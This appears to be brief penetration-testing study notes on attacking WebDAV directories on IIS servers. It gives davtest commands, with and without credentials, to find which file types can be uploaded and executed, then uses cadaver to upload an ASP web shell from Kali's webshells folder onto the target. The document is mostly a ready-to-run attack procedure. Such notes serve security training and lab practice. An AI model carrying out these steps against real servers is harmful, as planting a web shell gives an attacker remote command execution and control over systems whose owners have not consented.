
# WebDAV Exploitation

---

WebDAV is a protocol used in IIS Windows http servers which allows files to get
downloaded from this directory and modify and delete files.

A tool for this is davtest, it shows what kind of files we can execute and upload.

```
davtest -url http://<target_ip>/webdav/
```

### Authorized Access

```
davtest -auth bob:password -url http://<target_ip>/webdav/
```

The next step would be to use the cadaver tool, it will help to actually download, delete
edit and upload files into the directory.

```
cadaver --help shows syntax
```

```
cadaver http://<target_ip>/webdav/
```

```
ls -la /usr/share/webshells/asp/
```

--> go to cadaver --> put /usr/share/webshells/asp/webshell.asp